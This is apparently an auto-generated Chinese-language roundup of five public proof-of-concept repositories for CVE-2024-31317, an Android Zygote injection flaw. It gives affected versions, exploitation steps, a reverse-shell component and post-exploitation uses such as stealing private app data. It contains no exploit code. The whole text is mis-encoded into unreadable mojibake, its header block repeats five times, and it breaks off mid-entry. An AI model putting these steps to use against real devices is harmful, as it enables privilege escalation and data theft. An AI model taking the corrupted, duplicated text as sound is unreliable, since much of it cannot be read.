# CVE-2024-31317

> ğŸ“¦ è¯¥CVEæœ‰ **7** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-31317-Anonymous941_zygote-injection-toolkit.md](../2024/CVE-2024-31317-Anonymous941_zygote-injection-toolkit.md)

# CVE-2024-31317

> ğŸ“¦ è¯¥CVEæœ‰ **7** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-31317-Anonymous941_zygote-injection-toolkit.md](../2024/CVE-2024-31317-Anonymous941_zygote-injection-toolkit.md)

# CVE-2024-31317

> ğŸ“¦ è¯¥CVEæœ‰ **7** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-31317-Anonymous941_zygote-injection-toolkit.md](../2024/CVE-2024-31317-Anonymous941_zygote-injection-toolkit.md)

# CVE-2024-31317

> ğŸ“¦ è¯¥CVEæœ‰ **7** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-31317-Anonymous941_zygote-injection-toolkit.md](../2024/CVE-2024-31317-Anonymous941_zygote-injection-toolkit.md)

# CVE-2024-31317

> ğŸ“¦ è¯¥CVEæœ‰ **7** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-31317-Anonymous941_zygote-injection-toolkit.md](../2024/CVE-2024-31317-Anonymous941_zygote-injection-toolkit.md)

## CVE-2024-31317-Android Zygoteæ³¨å…¥

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ç‰¹æƒæå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯æå‡ä¸ºsystemæƒé™

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14 (June 1, 2024 security patch ä¹‹å‰)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ADBå’ŒUSBè°ƒè¯•å¼€å¯ï¼Œä»¥åŠæœªå®‰è£…2024å¹´6æœˆ1æ—¥ä¹‹åçš„å®‰å…¨è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 æ˜¯ä¸€ä¸ªAndroid Zygoteæ³¨å…¥æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œåˆ©ç”¨`WRITE_SECURE_SETTINGS`æƒé™ï¼Œå®ç°ä»¥ä»»æ„åº”ç”¨èº«ä»½æ‰§è¡Œä»£ç ã€‚æ­¤æ¼æ´ä¸éœ€è¦ç”¨æˆ·äº¤äº’ï¼Œæœ¬åœ°ç”¨æˆ·å³å¯åˆ©ç”¨æå‡æƒé™ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æœç´¢ç»“æœå’Œæä¾›çš„PoCä»£ç ï¼ˆ`zygote_injection_toolkit`ï¼‰ï¼Œå¯ä»¥åˆ¤æ–­è¯¥æ¼æ´åˆ©ç”¨ä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å¤šä¸ªæœç´¢ç»“æœï¼ˆä¾‹å¦‚ï¼Œwebpage 1, 3, 7, 9ï¼‰éƒ½æåˆ°äº†è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ï¼Œç”šè‡³æœ‰ä¸“é—¨çš„æ–‡ç« åˆ†æå’Œå¤ç°æ­¤æ¼æ´ã€‚PoCä»£ç åŒ…å«åˆ©ç”¨æ‰€éœ€çš„å¿…è¦æ–‡ä»¶å’Œåˆæ­¥æ¡†æ¶ï¼Œreadmeä¹Ÿè¯¦ç»†ä»‹ç»äº†æ¼æ´çš„åˆ©ç”¨æ¡ä»¶å’Œå½±å“ã€‚

**æŠ•æ¯’é£é™©ï¼š**
PoCä»£ç å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦ä¾æ®ä»¥ä¸‹å‡ ç‚¹ï¼š
*   **åŒ¿åä½œè€…å’ŒMITè®¸å¯è¯ï¼š** è™½ç„¶ä½¿ç”¨äº†MITè®¸å¯è¯ï¼Œä½†ä½œè€…ç½²åä¸ºAnonymous941ï¼Œç¼ºä¹èƒŒæ™¯ä¿¡æ¯ï¼Œå¢åŠ äº†ä»£ç å¯ä¿¡åº¦æ–¹é¢çš„é£é™©ã€‚
*   **å®éªŒæ€§ä»£ç ï¼š** ä»£ç å£°æ˜ä¸ºâ€œvery experimentalâ€ï¼Œæ„å‘³ç€å¯èƒ½å­˜åœ¨æœªçŸ¥çš„bugæˆ–åé—¨ã€‚
*   **ä¾èµ–é¡¹ï¼š** `pyproject.toml` ä¸­å£°æ˜ä¾èµ– `aidl@git+https://github.com/MatrixEditor/aidl-parser`ï¼Œç›´æ¥ä»GitHubå®‰è£…ï¼Œå¢åŠ äº†ä¾èµ–é¡¹è¢«ç¯¡æ”¹çš„é£é™©ï¼Œè™½ç„¶aidl-parseråº“çœ‹ä¸Šå»æ¯”è¾ƒå¯ä¿¡ï¼Œä½†ä¾ç„¶å­˜åœ¨é£é™©ã€‚
*   **ç¼ºä¹å®Œæ•´å®ç°ï¼š** æä¾›çš„ä»£ç ç‰‡æ®µå¹¶ä¸å®Œæ•´ï¼Œstage2éƒ¨åˆ†ç¼ºå¤±ï¼Œéœ€è¦ç”¨æˆ·è‡ªè¡Œå®ç°ï¼Œè¿™å¢åŠ äº†æ¶æ„ä»£ç æ³¨å…¥çš„å¯èƒ½æ€§ã€‚
è™½ç„¶`IOemLockService.aidl` æ˜¯ä¸€ä¸ªå·²çŸ¥çš„Androidæ¥å£å®šä¹‰ï¼Œ`LICENSE` æ˜¯ä¸€ä¸ªæ ‡å‡†çš„MITè®¸å¯ï¼Œ`README.md` æè¿°çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†æ˜¯è¿™äº›ä»£ç çš„ç»„åˆä»¥åŠä¾èµ–é¡¹å­˜åœ¨ä¸€å®šçš„é£é™©ï¼Œä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…æ•…æ„æ·»åŠ æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚é£é™©ä¸»è¦åœ¨äºä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“å’Œä»£ç çš„ä¸å®Œæ•´æ€§ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **å‰ææ¡ä»¶ï¼š** å¼€å¯Androidè®¾å¤‡çš„USBè°ƒè¯•ï¼Œå¹¶é€šè¿‡ADBè¿æ¥åˆ°è®¾å¤‡ã€‚
2.  **æ£€æŸ¥æ¼æ´ï¼š** è¿è¡ŒPoCä»£ç æ£€æŸ¥è®¾å¤‡æ˜¯å¦å—CVE-2024-31317å½±å“ï¼Œå³æ˜¯å¦å®‰è£…äº†2024å¹´6æœˆ1æ—¥ä¹‹å‰çš„å®‰å…¨è¡¥ä¸ã€‚
3.  **Zygoteæ³¨å…¥ï¼š** PoCä»£ç åˆ©ç”¨Zygoteè¿›ç¨‹ä¸­çš„æ¼æ´ï¼Œé€šè¿‡ä¸å®‰å…¨çš„ååºåˆ—åŒ–æœºåˆ¶ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ°Zygoteè¿›ç¨‹ä¸­ã€‚
4.  **æƒé™æå‡ï¼š** æ³¨å…¥çš„ä»£ç ä»¥`system`ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œï¼Œä»è€Œè·å¾—ç³»ç»Ÿçº§åˆ«çš„æƒé™ã€‚
5.  **æ‰§è¡Œæ¶æ„æ“ä½œï¼š** åˆ©ç”¨systemæƒé™ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
    *   å¤‡ä»½ç§æœ‰åº”ç”¨æ•°æ®
    *   ç¯¡æ”¹ç³»ç»Ÿåº”ç”¨æ•°æ®
    *   ç»•è¿‡OEMé™åˆ¶
    *   å°è¯•ç»•è¿‡è¿è¥å•†å¯¹Bootloaderè§£é”çš„é™åˆ¶
    *   ä¸å…¶ä»–ææƒæ¼æ´é“¾å¼åˆ©ç”¨ï¼Œå®ç°rootæƒé™ã€‚

**é¡¹ç›®åœ°å€:** [Anonymous941/zygote-injection-toolkit](https://github.com/Anonymous941/zygote-injection-toolkit)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #2

**æ¥æº**: [CVE-2024-31317-JadeByteZen_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-JadeByteZen_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** æƒé™æå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œå’Œæƒé™æå‡

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰§è¡Œæƒé™(User execution privileges needed)ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 æ¼æ´å­˜åœ¨äºAndroidç³»ç»Ÿçš„Zygoteè¿›ç¨‹ä¸­ï¼Œç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–å¯¼è‡´å¯ä»¥é€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™å®ç°ä»£ç æ‰§è¡Œã€‚è¯¥æ¼æ´å½±å“Android 12ã€12Lã€13å’Œ14ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æå‡æƒé™ï¼Œåœ¨å—å½±å“çš„è®¾å¤‡ä¸Šä»¥ä»»ä½•åº”ç”¨ç¨‹åºçš„èº«ä»½æ‰§è¡Œä»£ç ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼š**  `ZygoteProcess.java`ä¸­çš„å¤šä¸ªå‡½æ•°å­˜åœ¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **æƒé™æå‡ï¼š** æ”»å‡»è€…éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™ï¼Œè¿™ä¸ªæƒé™é€šå¸¸éœ€è¦é€šè¿‡å…¶ä»–æ¼æ´æˆ–è€…é€šè¿‡æ¬ºéª—ç”¨æˆ·æˆäºˆã€‚å¦‚æœæ”»å‡»è€…æ‹¥æœ‰äº†è¿™ä¸ªæƒé™,ä»–ä»¬å°±å¯ä»¥é€šè¿‡Zygoteè¿›ç¨‹æ‰§è¡Œä»£ç ï¼Œæ¨¡æ‹Ÿä»»ä½•appçš„èº«ä»½ã€‚
3.  **ä»£ç æ‰§è¡Œï¼š**  é€šè¿‡åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡è®¾å¤‡ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**POCæœ‰æ•ˆæ€§åˆ†æï¼š**

æä¾›çš„`Android_Zygote_Research_Kit.sh`è„šæœ¬åŒ…å«ä»¥ä¸‹ç»„ä»¶ï¼š

*   `reverse_shell.c`ï¼šä¸€ä¸ªåå‘shellç¨‹åºï¼Œç”¨äºåœ¨ç›®æ ‡è®¾å¤‡ä¸Šå»ºç«‹ä¸æ”»å‡»è€…çš„è¿æ¥ã€‚
*   `payload91011.txt` å’Œ `payload1213.txt`ï¼šé’ˆå¯¹ä¸åŒAndroidç‰ˆæœ¬çš„æ¼æ´åˆ©ç”¨payloadã€‚
*   `compile.sh`ï¼šç”¨äºç¼–è¯‘åå‘shellç¨‹åºçš„è„šæœ¬ã€‚
*   `README.txt` å’Œ `CVE-2024-31317.txt`ï¼šæä¾›æ¼æ´åˆ©ç”¨çš„è¯´æ˜å’ŒæŠ€æœ¯åˆ†æã€‚

è¯¥è„šæœ¬é€šè¿‡ç”Ÿæˆæ¶æ„payloadå¹¶ç»“åˆåå‘shellç¨‹åºï¼Œå®ç°äº†å¯¹CVE-2024-31317æ¼æ´çš„åˆ©ç”¨ã€‚å› æ­¤ï¼Œæä¾›çš„POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥ç”¨æ¥éªŒè¯å’Œåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è™½ç„¶è„šæœ¬ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼æ´ç ”ç©¶å’Œåˆ©ç”¨ï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼š

*   **åå‘Shellçš„æ½œåœ¨é£é™©ï¼š** `reverse_shell.c`æœ¬èº«å¯ä»¥è¢«è§†ä¸ºä¸€ç§åé—¨ã€‚ä¸€æ—¦æˆåŠŸåˆ©ç”¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è·å¾—è®¾å¤‡çš„æ§åˆ¶æƒï¼Œæ‰§è¡Œæ¶æ„æ“ä½œã€‚
*   **å…¶ä»–æ¶æ„ä»£ç æ¤å…¥é£é™©ï¼š** è„šæœ¬ä¸­å¯èƒ½åŒ…å«å…¶ä»–æœªå£°æ˜çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ä¿¡æ¯æ”¶é›†ã€æ¶æ„è½¯ä»¶ä¼ æ’­ç­‰ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å­˜åœ¨ï¼Œä½†ä¸»è¦é£é™©é›†ä¸­åœ¨åå‘shellçš„åŠŸèƒ½ä¸Šï¼Œä»¥åŠè„šæœ¬ä½œè€…å¯èƒ½æ¤å…¥çš„æ½œåœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ä½œè€…å£°æ˜çš„MITå¼€æºåè®®ä»¥åŠä»£ç ä¸­æ˜æ˜¾çš„åŠŸèƒ½å®ç°ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [JadeByteZen/CVE-2024-31317-PoC-Deployer](https://github.com/JadeByteZen/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #3

**æ¥æº**: [CVE-2024-31317-Webldix_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-Webldix_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ç‰¹æƒæå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´ä»»æ„åº”ç”¨ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™å’Œç”¨æˆ·æ‰§è¡Œæƒé™ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-31317æ˜¯Androidç³»ç»Ÿä¸­çš„ä¸€ä¸ªç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äº`ZygoteProcess.java`çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™åœ¨ä»»ä½•åº”ç”¨ä¸­æ‰§è¡Œä»£ç ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œåˆ©ç”¨æ­¤æ¼æ´æ— éœ€ç”¨æˆ·äº¤äº’ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´åœ¨Zygoteè¿›ç¨‹ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œè¿›è€Œæ§åˆ¶æ–°åˆ›å»ºçš„åº”ç”¨è¿›ç¨‹ã€‚æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ›´åƒä¸€ä¸ªåå‘shellçš„ç”Ÿæˆè„šæœ¬ï¼Œæœ¬èº«ä¸ç›´æ¥åŒ…å«æ¼æ´åˆ©ç”¨ä»£ç ï¼Œä½†è„šæœ¬ç”Ÿæˆçš„åå‘shellå¯ä»¥é€šè¿‡æ¼æ´åˆ©ç”¨payloadæ‰§è¡Œï¼Œé—´æ¥å®Œæˆæ¼æ´åˆ©ç”¨è¿‡ç¨‹ã€‚ æŠ•æ¯’é£é™©è¯„ä¼°ä¸º5%ï¼Œä¸»è¦æ˜¯å› ä¸ºè„šæœ¬æœ¬èº«ä¼šä»å¤–éƒ¨å¯¼å…¥payloadï¼Œå­˜åœ¨payloadè¢«æ›¿æ¢çš„é£é™©ï¼Œä¸”è„šæœ¬ä½œè€…å£°æ˜äº†å…è´£æ¡æ¬¾ï¼Œæš—ç¤ºå­˜åœ¨ä¸€å®šé£é™©ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œæ¼æ´æ˜¯ç”±äº`ZygoteProcess.java`ä¸­å­˜åœ¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–é€ æˆçš„ï¼Œé€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„åº”ç”¨çš„ä»£ç ã€‚æä¾›çš„è„šæœ¬åˆ›å»ºäº†ä¸€ä¸ªåå‘shellï¼Œè¯¥åå‘shelléœ€è¦è¢«æ³¨å…¥åˆ°åˆ©ç”¨é“¾ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–`WRITE_SECURE_SETTINGS`æƒé™ï¼š** æ”»å‡»è€…éœ€è¦é¦–å…ˆè·å–`WRITE_SECURE_SETTINGS`æƒé™ã€‚è¿™å¯ä»¥é€šè¿‡å·²æœ‰çš„æ¼æ´ã€æƒé™æå‡æˆ–è€…æ¶æ„åº”ç”¨æ¥å®ç°ã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š**  åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ„é€ æ¶æ„çš„payloadï¼Œè¯¥payloadä¼šæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„ä»£ç ï¼Œä¾‹å¦‚ï¼Œå¯åŠ¨ä¸€ä¸ªåå‘shellã€‚
3.  **åˆ©ç”¨Zygoteè¿›ç¨‹ï¼š**  é€šè¿‡æŸç§æ–¹å¼è§¦å‘Zygoteè¿›ç¨‹æ‰§è¡ŒåŒ…å«æ¶æ„payloadçš„ååºåˆ—åŒ–æ“ä½œã€‚
4.  **ä»£ç æ‰§è¡Œï¼š**  å½“Zygoteè¿›ç¨‹ååºåˆ—åŒ–æ¶æ„æ•°æ®æ—¶ï¼Œæ”»å‡»è€…çš„ä»£ç å°†åœ¨ç›®æ ‡åº”ç”¨è¿›ç¨‹ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°æƒé™æå‡ã€‚
5.  **åå‘Shellè¿æ¥:** æ”»å‡»è€…é€šè¿‡é¢„è®¾çš„IPå’Œç«¯å£æ¥æ”¶åå‘shellï¼Œä»è€Œæ§åˆ¶è®¾å¤‡

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„è„šæœ¬ä¸»è¦ç”¨äºç”Ÿæˆåå‘shellç›¸å…³çš„ä»£ç ï¼Œæœ¬èº«çœ‹èµ·æ¥æ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚ä½†éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

*   **Payloadçš„æ½œåœ¨é£é™©ï¼š** è¯¥è„šæœ¬ä¾èµ–äºå¤–éƒ¨æä¾›çš„payloadã€‚å¦‚æœpayloadè¢«æ›¿æ¢ä¸ºæ¶æ„ä»£ç ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´ä¸¥é‡çš„åæœã€‚
*   **åå‘Shellé£é™©ï¼š** åå‘shellæœ¬èº«å…·æœ‰é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºéæ³•ç›®çš„ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®ã€è¿œç¨‹æ§åˆ¶è®¾å¤‡ç­‰ã€‚
*   **è„šæœ¬ä½œè€…çš„å…è´£å£°æ˜:** è„šæœ¬ä½œè€…å£°æ˜äº†å…è´£æ¡æ¬¾ï¼Œæš—ç¤ºå­˜åœ¨ä¸€å®šé£é™©ã€‚

ç»¼åˆæ¥çœ‹ï¼Œè¯¥POCè„šæœ¬å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†é£é™©è¾ƒä½ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„å®‰å…¨æ€§ä»¥åŠè„šæœ¬æœ¬èº«å¯èƒ½è¢«æ»¥ç”¨ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [Webldix/CVE-2024-31317-PoC-Deployer](https://github.com/Webldix/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #4

**æ¥æº**: [CVE-2024-31317-agg23_cve-2024-31317.md](../2024/CVE-2024-31317-agg23_cve-2024-31317.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ç‰¹æƒæå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œå’Œæƒé™æå‡

**å½±å“ç‰ˆæœ¬:** 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™å’Œç”¨æˆ·æ‰§è¡Œæƒé™

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 æ˜¯ä¸€ä¸ª Android ç³»ç»Ÿä¸­çš„ç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ‹¥æœ‰ `WRITE_SECURE_SETTINGS` æƒé™çš„åº”ç”¨æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ¨¡æ‹Ÿä»»ä½•å…¶ä»–åº”ç”¨ç¨‹åºçš„èº«ä»½ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´è¢«è®¤ä¸ºæ˜¯ Android ç”¨æˆ·æ€ä¸­æœ€æœ‰ä»·å€¼çš„æ¼æ´ä¹‹ä¸€ã€‚å¤šä¸ªæ¥æºï¼ˆå¦‚Metaå®‰å…¨åšå®¢ã€dawnslabã€flanker017åšå®¢ï¼‰éƒ½æä¾›äº†æ¼æ´åˆ†æå’Œåˆ©ç”¨æ–¹æ³•ï¼Œè¡¨æ˜è¯¥æ¼æ´çš„PoCæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æä¾›çš„ PoC ä»£ç ä¸»è¦åŒ…å«æ¼æ´çš„è§£é‡Šã€Zygote å‚æ•°è¯´æ˜ä»¥åŠæ¨¡æ‹Ÿå™¨è®¾ç½®æŒ‡å—ï¼Œå¹¶æ²¡æœ‰æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä½†è€ƒè™‘åˆ°ä»£ç ä¸­å¯èƒ½å­˜åœ¨éšè—çš„åé—¨æˆ–æœªå…¬å¼€çš„åˆ©ç”¨æ–¹å¼ï¼Œä¾‹å¦‚å¯¹ç³»ç»Ÿå±æ€§çš„æ¶æ„ä¿®æ”¹ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚é£é™©è¯„ä¼°ä¸º10%ï¼Œé£é™©è¾ƒä½ä½†ä¸å¯å¿½è§†ã€‚ä¸»è¦é£é™©ç‚¹åœ¨äºåˆ©ç”¨`system`æƒé™æ‰§è¡ŒæœªçŸ¥çš„æ“ä½œï¼Œå¯èƒ½å­˜åœ¨éšè”½çš„æ¶æ„è¡Œä¸ºã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ©ç”¨å…·æœ‰ `WRITE_SECURE_SETTINGS` æƒé™çš„åº”ç”¨ç¨‹åºã€‚
2.  é€šè¿‡æ„é€ ç‰¹å®šçš„ Zygote å¯åŠ¨å‚æ•°ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ã€‚
3.  ä½¿ Zygote è¿›ç¨‹ä»¥ç›®æ ‡åº”ç”¨ç¨‹åºçš„ UID å’Œ SELinux ä¸Šä¸‹æ–‡å¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹ã€‚
4.  åœ¨æ–°è¿›ç¨‹ä¸­æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä»è€Œè·å¾—ç›®æ ‡åº”ç”¨ç¨‹åºçš„æƒé™ã€‚æ¯”å¦‚åˆ©ç”¨`shell`æƒé™å¯ä»¥æ‰§è¡Œadb shellå‘½ä»¤ï¼Œåˆ©ç”¨`system`æƒé™å¯ä»¥ä¿®æ”¹ç³»ç»Ÿå±æ€§ã€‚

æ€»è€Œè¨€ä¹‹ï¼Œæ¼æ´åˆ©ç”¨ä¾èµ–äºå¯¹ Zygote å¯åŠ¨å‚æ•°çš„ç²¾ç¡®æ„é€ ä»¥åŠç›®æ ‡ Android ç‰ˆæœ¬çš„ç‰¹æ€§ã€‚

**é¡¹ç›®åœ°å€:** [agg23/cve-2024-31317](https://github.com/agg23/cve-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #5

**æ¥æº**: [CVE-2024-31317-fuhei_CVE-2024-31317.md](../2024/CVE-2024-31317-fuhei_CVE-2024-31317.md)

## CVE-2024-31317 - Android Zygote Deserialization/Command Injection

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** æƒé™æå‡ (Elevation of Privilege)

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®ç°æœ¬åœ°æƒé™æå‡ï¼Œä»¥ä»»æ„åº”ç”¨èº«ä»½æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ `WRITE_SECURE_SETTINGS` æƒé™ã€‚é€šå¸¸å¯é€šè¿‡ ADB æˆ–å…¶ä»–æ¼æ´è·å–ã€‚ä½ç‰ˆæœ¬Androidå¯ä»¥ç›´æ¥é€šè¿‡å‘½ä»¤æ³¨å…¥ï¼Œé«˜ç‰ˆæœ¬éœ€è¦Bypassæ–¹æ¡ˆã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 å…è®¸æ”»å‡»è€…åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æˆ–å‘½ä»¤æ³¨å…¥ï¼Œåœ¨ Zygote è¿›ç¨‹ä¸­ä»¥ä»»æ„åº”ç”¨èº«ä»½æ‰§è¡Œä»£ç ã€‚è¯¥æ¼æ´å­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ `WRITE_SECURE_SETTINGS` æƒé™è®¾ç½®æ¶æ„çš„ `hidden_api_blacklist_exemptions` å€¼ï¼Œä»è€Œæ³¨å…¥æ¶æ„å‚æ•°ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

